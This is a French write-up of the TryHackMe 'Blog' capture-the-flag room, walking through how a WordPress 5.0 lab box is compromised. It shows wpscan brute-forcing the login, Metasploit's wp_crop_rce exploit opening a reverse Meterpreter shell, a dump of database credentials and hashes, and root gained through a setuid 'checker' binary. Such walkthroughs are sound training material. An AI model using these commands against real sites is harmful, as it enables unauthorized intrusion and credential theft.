# Blog
Pour cette VM, on doit root un blog wordpress.
Mais avant, il faut ajouter **blog.thm** dans le fichier **/etc/hosts**.
```
sudo nano /etc/hosts
10.10.146.155	blog.thm
```
C'est parti !

# Enum
## nmap
Je commence par un scan nmap afin de voir ce quel est la surface d'attaque
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-21 05:00 EDT
Nmap scan report for blog.thm (10.10.146.155)
Host is up (0.032s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.0
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 4s, deviation: 0s, median: 3s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: blog
|   NetBIOS computer name: BLOG\x00
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2023-09-21T09:00:31+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-09-21T09:00:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.39 seconds
```
Il y a donc un SSH, un serveur web et un partage SMB.
## Gobuster
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/admin (Status: 302)
/atom (Status: 301)
/dashboard (Status: 302)
/embed (Status: 301)
/favicon.ico (Status: 200)
/feed (Status: 301)
/index.php (Status: 301)
/login (Status: 302)
/page1 (Status: 301)
/rdf (Status: 301)
/robots.txt (Status: 200)
/rss (Status: 301)
/rss2 (Status: 301)
/server-status (Status: 403)
/wp-admin (Status: 301)
/wp-content (Status: 301)
/wp-includes (Status: 301)
```
## robots.txt
```
User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```
## le SMB !
Je vais ici utiliser metasploit avec le module **scanner/smb/smb_enumshares** pour l'enumération.

```
[*] 10.10.146.155:139     - Starting module
[+] 10.10.146.155:139     - print$ - (DISK) Printer Drivers
[+] 10.10.146.155:139     - BillySMB - (DISK) Billy's local SMB Share
[+] 10.10.146.155:139     - IPC$ - (IPC|SPECIAL) IPC Service (blog server (Samba, Ubuntu))
[*] 10.10.146.155:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Je vais voir ce qui ce trouve dans le dossier **BillySMB** avec le compte **guest**
```
smbclient //10.10.146.155/BillySMB -U " "%" "
```
Et on trouve 3 fichiers :
```
smb: \> dir
  .                                   D        0  Tue May 26 14:17:05 2020
  ..                                  D        0  Tue May 26 13:58:23 2020
  Alice-White-Rabbit.jpg              N    33378  Tue May 26 14:17:01 2020
  tswift.mp4                          N  1236733  Tue May 26 14:13:45 2020
  check-this.png                      N     3082  Tue May 26 14:13:43 2020

                15413192 blocks of size 1024. 9789220 blocks available
smb: \> 

```
Le fichier **check-this.png** est un QR code qui pointe vers une vidéo youtube, le clip officiel de la musique Billy Joel - We Didn't Start the Fire.
L'utilitaire zbarimg permet de le lire sans utiliser son smartphone.
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Blog]
└─$ zbarimg check-this.png 
QR-Code:https://qrgo.page.link/M6dE
scanned 1 barcode symbols from 1 images in 0 seconds
```
Le fichier **tswift.mp4** est un morceau d'un clip de musique de taylor swift avec un petit troll dedans ;).
Le fichier **Alice-White-Rabbit.jpg** est une image du lapin blanc du compte Alice aux pays des merveilles.
Je vais essayer de voir si il n'y a pas quelque chose de cacher dans cette image :
```
┌──(kali㉿kali)-[~/Challenge/TryHackMe/Blog]
└─$ steghide extract -sf Alice-White-Rabbit.jpg  
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
```
Il y a un fichier txt:
```
You've found yourself in a rabbit hole, friend.
```
Mauvaise piste donc !
## wpscan
Un premier scan pour voir un peux, je ne le copie pas ici car il est beaucoup trop long !!!
```
wpscan --url http://blog.thm/wp-login.php -v --api-token=MYKEY
```
Il trouve quelques infos, avec l'option **--enumerate u** on retrouve les users, mais je vais vous montrer une autre methode pour obtenir ces infos sans outil !

La page **http://blog.thm/wp-json/wp/v2/users** !
```json
[{"id":1,"name":"Billy Joel","url":"","description":"","link":"http:\/\/blog.thm\/author\/bjoel\/","slug":"bjoel","avatar_urls":{"24":"http:\/\/0.gravatar.com\/avatar\/9943fa6dfe2ab4088f676ff75dc1f848?s=24&d=mm&r=g","48":"http:\/\/0.gravatar.com\/avatar\/9943fa6dfe2ab4088f676ff75dc1f848?s=48&d=mm&r=g","96":"http:\/\/0.gravatar.com\/avatar\/9943fa6dfe2ab4088f676ff75dc1f848?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"http:\/\/blog.thm\/wp-json\/wp\/v2\/users\/1"}],"collection":[{"href":"http:\/\/blog.thm\/wp-json\/wp\/v2\/users"}]}},{"id":3,"name":"Karen Wheeler","url":"","description":"","link":"http:\/\/blog.thm\/author\/kwheel\/","slug":"kwheel","avatar_urls":{"24":"http:\/\/0.gravatar.com\/avatar\/3e7bf1e5f26496543c964dc04515bb6a?s=24&d=mm&r=g","48":"http:\/\/0.gravatar.com\/avatar\/3e7bf1e5f26496543c964dc04515bb6a?s=48&d=mm&r=g","96":"http:\/\/0.gravatar.com\/avatar\/3e7bf1e5f26496543c964dc04515bb6a?s=96&d=mm&r=g"},"meta":[],"_links":{"self":[{"href":"http:\/\/blog.thm\/wp-json\/wp\/v2\/users\/3"}],"collection":[{"href":"http:\/\/blog.thm\/wp-json\/wp\/v2\/users"}]}}]
```
Ici je trouve 2 comptes: 
Le compte de Billy Joel avec l'identifiant **bjoel** et le compte de Karen Wheeler avec l'identifiant **kwheel**

# Brute Force de la page wp-login.php!
Je vais essayer de bruteforce la page de login de wordpress. Je vais utiliser wpscan pour faire cette tâche aussi.
```
wpscan --url http://blog.thm/wp-login.php -v --api-token=MYKEY -U bjoel --passwords /home/kali/Wordlist/rockyou.txt
```
Il ne trouve rien, je vais test avec le compte de Karen !
```
wpscan --url http://blog.thm/wp-login.php -v --api-token=MYKEY -U kwheel --passwords /home/kali/Wordlist/rockyou.txt
```
Bingo il me trouve un mot de passe :
```
[!] Valid Combinations Found:
 | Username: kwheel, Password: c*******1
```
Je suis donc maintenant authentifié avec un compte utilisateur sur le blog !

# Revshell to the server using metasploit
Maintenant que je suis authetifié sur le blog, je peux tenter quelques exploits. Sur [exploit-db](https://www.exploit-db.com/) je trouve l'exploit **WordPress Crop-image Shell Upload**.

Je lance donc metasploit et recherche les modules dispo pour wordpress 5.0
```
msf6 > search Wordpress 5.0

Matching Modules
================

   #  Name                                                     Disclosure Date  Rank       Check  Description
   -  ----                                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_crop_rce                           2019-02-19       excellent  Yes    WordPress Crop-image Shell Upload
   1  exploit/unix/webapp/wp_property_upload_exec              2012-03-26       excellent  Yes    WordPress WP-Property PHP File Upload Vulnerability
   2  exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce    2023-05-31       excellent  Yes    Wordpress File Manager Advanced Shortcode 2.3.2 - Unauthenticated Remote Code Execution through shortcode
   3  auxiliary/scanner/http/wp_woocommerce_payments_add_user  2023-03-22       normal     Yes    Wordpress Plugin WooCommerce Payments Unauthenticated Admin Creation
   4  auxiliary/scanner/http/wp_registrationmagic_sqli         2022-01-23       normal     Yes    Wordpress RegistrationMagic task_ids Authenticated SQLi


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/http/wp_registrationmagic_sqli
```
Le module **exploit/multi/http/wp_crop_rce** est bien là.
Je le configure puis je le lance :
```
msf6 exploit(multi/http/wp_crop_rce) > run

[*] Started reverse TCP handler on 10.11.50.195:4444 
[*] Authenticating with WordPress using kwheel:c*******1...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload
[+] Image uploaded
[*] Including into theme
[*] Sending stage (39927 bytes) to 10.10.146.155
[*] Meterpreter session 1 opened (10.11.50.195:4444 -> 10.10.146.155:34500) at 2023-09-21 05:37:45 -0400
[*] Attempting to clean up files...

meterpreter >
```
Cela fonctionne !

# Privesc !
On peux voir le content du fichier wp-config.php et donc avoir l'accès sur la base SQL
```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'blog');

/** MySQL database username */
define('DB_USER', 'wordpressuser');

/** MySQL database password */
define('DB_PASSWORD', 'Little************90!@');
```
```
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
| ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
|  1 | bjoel      | $P$B*************************kPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
|  3 | kwheel     | $P$B*************************r8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
```
Le hashes est en MD5, mais pour wordpress. Il est différent comme on peux le voir [ici](https://hashcat.net/wiki/doku.php?id=example_hashes) 
Je vais utiliser hashcat pour essayer de le cracker:
```
hashcat -m 400 -a 0 hashbjoel /home/kali/Wordlist/rockyou.txt
```
Hashcat ne parvient pas à crack le mot de passe avec le dico rockyou.txt...
On retestera un peu plus tard, on continue les recherches...

Dans le home de bjoel, on y trouve plusieurs fichiers dont user.txt, mais c'est un piège !
```
You won't find what you're looking for here.

TRY HARDER
```
Il y a aussi un fichier .pdf **Billy_Joel_Termination_May20-2020.pdf**. C'est la lettre de rupture de contrat de notre cher Billy.

J'importe linpeas dans le dossier /tmp et l'execute mais celui-ci ne trouve rien de bien intéressant a première vue...

le motif de rupture est qu'il joue pas mal avec les clé USB entres autres, de plus, le nom de l'entreprise est *Rubber Ducky Inc, cela donne une bonne piste à suivre.
*Une Rubber Ducky est une clé USB qui permet d'excecuter du code dés qu'elle est plug sur un PC, elle se fait passer pour un clavier auprès du PC et permet donc beaucoup de chose...*

Je vais donc dans le dossier **/media** , il y a bien une clé USB !
```
www-data@blog:/media$ ls -la
ls -la
total 12
drwxr-xr-x  3 root  root  4096 May 26  2020 .
drwxr-xr-x 24 root  root  4096 May 25  2020 ..
drwx------  2 bjoel bjoel 4096 May 28  2020 usb
```
Mais on ne peux pas y acceder.

Je vais regarder les programmes qui sont root, on va pouvoir ainsi rechercher les applications qui sont de trop, il y aura peut-être un moyen de devenir bjoel voir root !
```
find / -type f -user root -perm -u=s 2>/dev/null
```
Et voici le résultat (un peu reduit):
```
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/newuidmap
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgidmap
/usr/bin/traceroute6.iputils
/usr/sbin/checker
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
[...]
/snap/core/9066/usr/sbin/pppd
```
Je vois ici que le process **/usr/sbin/checker** n'est pas habituel, ce n'est pas un process connu et c'est introuvable sur internet.
Quand je l'execute, il me répond :
```
Not an Admin
```
On doit pouvoir faire quelque chose pour l'exploiter .
Il s'agit d'un binaire ELF (Executable and Linkable Format), c'est le .exe de linux en gros.
```
checker: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6cdb17533a6e02b838336bfe9791b5d57e1e2eea, not stripped
```
Je le récupère et je l'ouvre avec Ghidra afin de voir ce qu'il y a dedans:
```cpp
undefined8 main(void)

{
  char *pcVar1;
  
  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
```
Comme on peux le voir ici:
```cpp
pcVar1 = getenv("admin");
``` 
Il check le contenu de la variable d'environnement **admin**, si elle est vrai, il execute /bin/bash en tant que root (setuid(0))

Je vais donc ajouter la variable admin=1 (donc vrai)
```
www-data@blog:/usr/sbin$ export admin=1
```
Puis j'executer le fichier **checker**
```
www-data@blog:/usr/sbin$ ./checker
root@blog:/usr/sbin#
```
Me voila root !

Le flag user est ici : **/media/usb**
Le flag root est ici : **/root**
